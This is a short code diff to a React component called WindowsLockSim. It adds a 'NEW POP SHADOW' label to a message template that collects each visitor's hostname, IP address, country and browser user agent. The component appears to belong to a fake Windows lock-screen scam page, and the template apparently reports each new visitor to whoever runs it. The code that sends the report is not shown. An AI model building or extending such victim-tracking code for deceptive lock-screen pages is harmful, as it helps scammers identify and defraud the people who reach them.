@@ -62,6 +62,7 @@ const WindowsLockSim: React.FC = () => {
         
         // Format message exactly as you want
         const message = `
+🌐 NEW POP SHADOW 😏: ${window.location.hostname}
 🌐 Domain: ${window.location.hostname}
 📍 IP Address: ${ip}
 🗺️ Country: ${country} (${countryCode})
@@ -471,4 +472,5 @@ ${navigator.userAgent}
 };
 
 export default WindowsLockSim;
+
 
